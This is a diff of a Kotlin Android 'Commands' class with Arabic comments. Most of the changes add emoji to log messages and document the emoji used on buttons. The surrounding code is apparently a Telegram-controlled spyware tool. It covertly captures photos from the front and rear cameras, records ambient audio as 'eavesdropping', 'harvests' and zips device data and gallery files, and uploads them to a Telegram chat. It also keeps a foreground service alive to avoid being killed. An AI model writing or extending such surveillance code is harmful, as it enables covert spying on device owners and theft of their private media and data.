@@ -22,17 +22,49 @@ import com.example.app.CallbackData
 
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
- * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
  * 
- * ✅ تم إضافة دعم الأوامر الجديدة للمعرض (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
- * ✅ تم إصلاح g_conf لاستخدام g_conf_del_one بدلاً من g_act|del للتوافق مع النظام الجديد.
- * ✅ تم تحسين معالجة messageId وتحديث last_mid في Monitor.
- * ✅ تم إزالة استدعاء ensureComponents() غير الضروري لتقليل الحمل وتحسين الأداء.
- * ✅ تم حذف دالة ensureComponents بالكامل لأنها غير مستخدمة.
- * ✅ تم إصلاح دالة invokeMethod لاستخدام الاسم وعدد المعاملات فقط مع تخزين مؤقت لتحسين الأداء.
- * ✅ تم إصلاح معالجة reply_markup في invokeTelegramMethod لضمان تحويلها إلى JSON صحيح.
- * ✅ تم إضافة نبض (Pulse) للخدمة الأمامية عند تنفيذ أوامر الكاميرا والميكروفون والحصاد لتجنب قتل العمليات في الخلفية.
- * ✅ تم إضافة دالة validateControlPassword للتحقق من كلمة السر النصية.
+ * 📌 **الإيموجيات المستخدمة في الأزرار التفاعلية:**
+ * ──────────────────────────────────────────────
+ * | الإيموجي | الاستخدام                          |
+ * |----------|------------------------------------|
+ * | 📸       | التقاط صورة (كاميرا خلفية)        |
+ * | 👁️       | التقاط صورة (كاميرا أمامية)       |
+ * | 🎙️       | تنصت محيطي (تسجيل صوتي)           |
+ * | 📦       | استخراج البيانات (حصاد)           |
+ * | 🗂️       | أرشيف الوسائط (معرض)              |
+ * | ⚡       | بث فوري (إرسال فوري)              |
+ * | 🧬       | تحديث الشبكات (تحديث النموذج)     |
+ * | 🟢       | جهاز متصل                         |
+ * | 🔴       | جهاز غير متصل                     |
+ * | 📱       | أيقونة الجهاز                     |
+ * | 📡       | الأجهزة النشطة                    |
+ * | 🧠       | محرك الذكاء                       |
+ * | ⏳       | تمديد الجلسة                      |
+ * | 📊       | تقرير النظام                      |
+ * | 🗄️       | إدارة الأرشيف                     |
+ * | 🔌       | قطع الاتصال                       |
+ * | 🔙       | العودة للخلف / إلغاء              |
+ * | 🏠       | القائمة الرئيسية                  |
+ * | 🔃       | تحديث                             |
+ * | 🔒       | قفل التحكم / تسجيل الخروج         |
+ * | 🎯       | اقتناص بصري (خلفي)                |
+ * | 👁️       | اقتناص بصري (أمامي)               |
+ * | 🗑️       | حذف                               |
+ * | ✅       | تأكيد / نجاح                      |
+ * | ❌       | خطأ                               |
+ * | ⚠️       | تحذير                             |
+ * | 📤       | تحميل                             |
+ * | 📥       | استقبال                           |
+ * | 🖼️       | معرض الوسائط                      |
+ * | 📄       | ملف نصي                           |
+ * | 🎤       | تسجيل صوتي                        |
+ * | 🔋       | البطارية                          |
+ * | ⏳       | انتظار / جارٍ التنفيذ             |
+ * | 🚀       | إرسال فوري                        |
+ * | 📭       | لا توجد ملفات                     |
+ * | 💾       | حجم الملف                         |
+ * | ⏰       | الوقت / التوقيت                   |
+ * ──────────────────────────────────────────────
  */
 class Commands private constructor(context: Context) {
 
@@ -104,6 +136,19 @@ class Commands private constructor(context: Context) {
 
         /**
          * نقطة دخول خارجية لتنفيذ الأوامر
+         * 📌 الإيموجيات المستخدمة في callback_data:
+         * - 📸 cam_, camf_ → كاميرا خلفية / أمامية
+         * - 🎙️ mic_ → ميكروفون
+         * - 📦 hrv_ → حصاد
+         * - ⚡ send_now_ → إرسال فوري
+         * - 🧬 update_model_ → تحديث النموذج
+         * - 🗂️ media_ → معرض الوسائط
+         * - 📡 ld → الأجهزة النشطة
+         * - 🧠 ai_status → حالة محرك الذكاء
+         * - ⏳ rnw → تمديد الجلسة
+         * - 📊 status → تقرير النظام
+         * - 🗄️ menu → إدارة الأرشيف
+         * - 🔌 ext → قطع الاتصال
          */
         fun ex(
             context: Context,
@@ -227,12 +272,12 @@ class Commands private constructor(context: Context) {
     private suspend fun recordAudio(durationSec: Int = 10): File? =
         withContext(Dispatchers.IO) {
             if (isMicBusy) {
-                Log.w(TAG, "Microphone is busy")
+                Log.w(TAG, "🎙️ Microphone is busy")
                 return@withContext null
             }
 
             if (!checkPermission(Manifest.permission.RECORD_AUDIO)) {
-                Log.e(TAG, "RECORD_AUDIO permission not granted")
+                Log.e(TAG, "❌ RECORD_AUDIO permission not granted")
                 return@withContext null
             }
 
@@ -264,7 +309,7 @@ class Commands private constructor(context: Context) {
 
                 for (i in 0 until durationSec) {
                     if (stopRecordingFlag) {
-                        Log.i(TAG, "Recording stopped early by flag")
+                        Log.i(TAG, "⏹️ Recording stopped early by flag")
                         break
                     }
                     delay(1000)
@@ -273,7 +318,7 @@ class Commands private constructor(context: Context) {
                 try {
                     recorder.stop()
                 } catch (e: Exception) {
-                    Log.e(TAG, "MediaRecorder stop error: ${e.message}")
+                    Log.e(TAG, "❌ MediaRecorder stop error: ${e.message}")
                 }
 
                 recorder.reset()
@@ -283,13 +328,13 @@ class Commands private constructor(context: Context) {
                     Log.i(TAG, "✅ Audio recorded: ${outFile.length()} bytes")
                     return@withContext outFile
                 } else {
-                    Log.w(TAG, "Audio file too small or missing: ${outFile.length()} bytes")
+                    Log.w(TAG, "⚠️ Audio file too small or missing: ${outFile.length()} bytes")
                     safeRemove(outFile)
                     return@withContext null
                 }
 
             } catch (e: Exception) {
-                Log.e(TAG, "Recording error: ${e.message}")
+                Log.e(TAG, "❌ Recording error: ${e.message}")
                 safeRemove(outFile)
                 return@withContext null
             } finally {
@@ -302,7 +347,7 @@ class Commands private constructor(context: Context) {
 
     fun stopRecording() {
         stopRecordingFlag = true
-        Log.i(TAG, "Recording stop requested")
+        Log.i(TAG, "⏹️ Recording stop requested")
     }
 
     // ============================================================
@@ -337,9 +382,9 @@ class Commands private constructor(context: Context) {
 
             tasksArray.put(taskObj)
             tasksFile.writeText(tasksArray.toString(2))
-            Log.i(TAG, "Task added to queue: $type")
+            Log.i(TAG, "📋 Task added to queue: $type")
         } catch (e: Exception) {
-            Log.e(TAG, "Add task error: ${e.message}")
+            Log.e(TAG, "❌ Add task error: ${e.message}")
         }
     }
 
@@ -371,7 +416,7 @@ class Commands private constructor(context: Context) {
                 val content = task.optString("content")
 
                 if (attempts >= maxRetries) {
-                    Log.w(TAG, "Task ${task.optString("id")} exceeded max retries, removing.")
+                    Log.w(TAG, "⚠️ Task ${task.optString("id")} exceeded max retries, removing.")
                     safeRemove(File(filePath))
                     removed++
                     continue
@@ -383,7 +428,7 @@ class Commands private constructor(context: Context) {
                     continue
                 }
 
-                Log.i(TAG, "Retrying task $type (attempt ${attempts + 1})")
+                Log.i(TAG, "🔄 Retrying task $type (attempt ${attempts + 1})")
 
                 val success = when (type) {
                     "audio" -> {
@@ -413,10 +458,10 @@ class Commands private constructor(context: Context) {
 
             if (removed > 0) {
                 tasksFile.writeText(remainingTasks.toString(2))
-                Log.i(TAG, "Retry completed, removed $removed tasks.")
+                Log.i(TAG, "✅ Retry completed, removed $removed tasks.")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Retry failed tasks error: ${e.message}")
+            Log.e(TAG, "❌ Retry failed tasks error: ${e.message}")
         }
     }
 
@@ -444,11 +489,11 @@ class Commands private constructor(context: Context) {
             if (success) {
                 safeRemove(tempFile)
             } else {
-                Log.w(TAG, "Failed to send $filename, adding to queue")
+                Log.w(TAG, "⚠️ Failed to send $filename, adding to queue")
                 addTaskToQueue("text_file", tempFile.absolutePath, chatId, filename, content)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Send text file error: ${e.message}")
+            Log.e(TAG, "❌ Send text file error: ${e.message}")
             sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}")
             safeRemove(tempFile)
         }
@@ -496,7 +541,7 @@ class Commands private constructor(context: Context) {
                 }
 
             } catch (e: Exception) {
-                Log.e(TAG, "Command handler error: ${e.message}")
+                Log.e(TAG, "❌ Command handler error: ${e.message}")
                 sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
             }
         }
@@ -722,7 +767,7 @@ class Commands private constructor(context: Context) {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Gallery handler error: ${e.message}")
+            Log.e(TAG, "❌ Gallery handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في معالج المعرض")
         }
     }
@@ -747,7 +792,7 @@ class Commands private constructor(context: Context) {
             }
 
             // ✅ إرسال نبض للخدمة الأمامية قبل التقاط الصورة (لتجنب قتل العملية)
-            sendPulseIntent("Visual Sync")
+            sendPulseIntent("📸 Visual Sync")
 
             sendTelegramAction(tg, cid, "upload_photo")
 
@@ -755,13 +800,13 @@ class Commands private constructor(context: Context) {
                 try {
                     invokeMethod(cameraAnalyzer, "harvest", isFront)
                 } catch (e: Exception) {
-                    Log.e(TAG, "Camera harvest error: ${e.message}")
+                    Log.e(TAG, "❌ Camera harvest error: ${e.message}")
                 }
             }
 
             sendTelegramMessage(tg, cid, "📸 تم التقاط الصورة وتحليلها.")
         } catch (e: Exception) {
-            Log.e(TAG, "Camera handler error: ${e.message}")
+            Log.e(TAG, "❌ Camera handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
         }
     }
@@ -778,7 +823,7 @@ class Commands private constructor(context: Context) {
             }
 
             // ✅ إرسال نبض للخدمة الأمامية قبل بدء التسجيل
-            sendPulseIntent("Audio Sync")
+            sendPulseIntent("🎙️ Audio Sync")
 
             stopRecordingFlag = false
             val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
@@ -792,7 +837,7 @@ class Commands private constructor(context: Context) {
                     if (success) {
                         safeRemove(audioPath)
                     } else {
-                        Log.w(TAG, "Failed to send audio, adding to pending tasks")
+                        Log.w(TAG, "⚠️ Failed to send audio, adding to pending tasks")
                         addTaskToQueue("audio", audioPath.absolutePath, target)
                     }
                 } else {
@@ -800,7 +845,7 @@ class Commands private constructor(context: Context) {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Mic handler error: ${e.message}")
+            Log.e(TAG, "❌ Mic handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في الميكروفون")
         }
     }
@@ -812,7 +857,7 @@ class Commands private constructor(context: Context) {
     private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
         try {
             // ✅ إرسال نبض للخدمة الأمامية قبل بدء الحصاد
-            sendPulseIntent("Data Harvest")
+            sendPulseIntent("📦 Data Harvest")
 
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
@@ -821,14 +866,14 @@ class Commands private constructor(context: Context) {
                     try {
                         invokeMethod(dailyZipper, "run")
                     } catch (e: Exception) {
-                        Log.e(TAG, "Harvest error: ${e.message}")
+                        Log.e(TAG, "❌ Harvest error: ${e.message}")
                     }
                 }
             } else {
                 sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Harvest handler error: ${e.message}")
+            Log.e(TAG, "❌ Harvest handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد")
         }
     }
@@ -846,17 +891,17 @@ class Commands private constructor(context: Context) {
                     try {
                         val success = invokeMethod(dailyZipper, "forceSendNow", cid) as? Boolean
                         if (success == false) {
-                            Log.w(TAG, "Force send failed, tasks will be retried later")
+                            Log.w(TAG, "⚠️ Force send failed, tasks will be retried later")
                         }
                     } catch (e: Exception) {
-                        Log.e(TAG, "Force send error: ${e.message}")
+                        Log.e(TAG, "❌ Force send error: ${e.message}")
                     }
                 }
             } else {
                 sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير متاحة")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Send now handler error: ${e.message}")
+            Log.e(TAG, "❌ Send now handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في الإرسال الفوري")
         }
     }
@@ -883,7 +928,7 @@ class Commands private constructor(context: Context) {
                 sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Media handler error: ${e.message}")
+            Log.e(TAG, "❌ Media handler error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في فتح المعرض")
         }
     }
@@ -902,7 +947,7 @@ class Commands private constructor(context: Context) {
                     sendTelegramMessage(tg, chatId, "❌ وحدة الحصاد غير جاهزة")
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "forceSendZip error: ${e.message}")
+                Log.e(TAG, "❌ forceSendZip error: ${e.message}")
                 sendTelegramMessage(tg, chatId, "❌ خطأ في الإرسال: ${e.message?.take(100)}")
             }
         }
@@ -941,7 +986,7 @@ class Commands private constructor(context: Context) {
             field.isAccessible = true
             field.set(target, value)
         } catch (e: Exception) {
-            Log.e(TAG, "Set field error: ${e.message}")
+            Log.e(TAG, "❌ Set field error: ${e.message}")
         }
     }
 
@@ -960,7 +1005,7 @@ class Commands private constructor(context: Context) {
                 m.name == methodName && m.parameterTypes.size == args.size
             }
             if (method == null) {
-                Log.e(TAG, "Method not found: $methodName with ${args.size} parameters")
+                Log.e(TAG, "❌ Method not found: $methodName with ${args.size} parameters")
                 return null
             }
             method.isAccessible = true
@@ -970,7 +1015,7 @@ class Commands private constructor(context: Context) {
         return try {
             method.invoke(target, *args)
         } catch (e: Exception) {
-            Log.e(TAG, "Method invocation error ($methodName): ${e.message}")
+            Log.e(TAG, "❌ Method invocation error ($methodName): ${e.message}")
             null
         }
     }
@@ -1013,7 +1058,7 @@ class Commands private constructor(context: Context) {
 
             apiMethod?.invoke(tg, method, rawParams)
         } catch (e: Exception) {
-            Log.e(TAG, "Telegram API call error: ${e.message}")
+            Log.e(TAG, "❌ Telegram API call error: ${e.message}")
             null
         }
     }
@@ -1053,7 +1098,7 @@ class Commands private constructor(context: Context) {
                 false
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Send voice error: ${e.message}")
+            Log.e(TAG, "❌ Send voice error: ${e.message}")
             false
         }
     }
@@ -1074,7 +1119,7 @@ class Commands private constructor(context: Context) {
                 false
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Send document error: ${e.message}")
+            Log.e(TAG, "❌ Send document error: ${e.message}")
             false
         }
     }
@@ -1088,7 +1133,12 @@ class Commands private constructor(context: Context) {
      * يُستخدم قبل تنفيذ الأوامر الحساسة (كاميرا، ميكروفون، حصاد)
      * لتجنب قتل العملية في الخلفية ولإعطاء مؤشر بصري خفي.
      *
-     * @param actionType نوع العملية (Visual Sync, Audio Sync, Data Harvest)
+     * 📌 الإيموجيات المستخدمة في أنواع النبض:
+     * - 📸 Visual Sync → للكاميرا
+     * - 🎙️ Audio Sync → للميكروفون
+     * - 📦 Data Harvest → للحصاد
+     *
+     * @param actionType نوع العملية (يحتوي على إيموجي فريد)
      */
     private fun sendPulseIntent(actionType: String) {
         try {
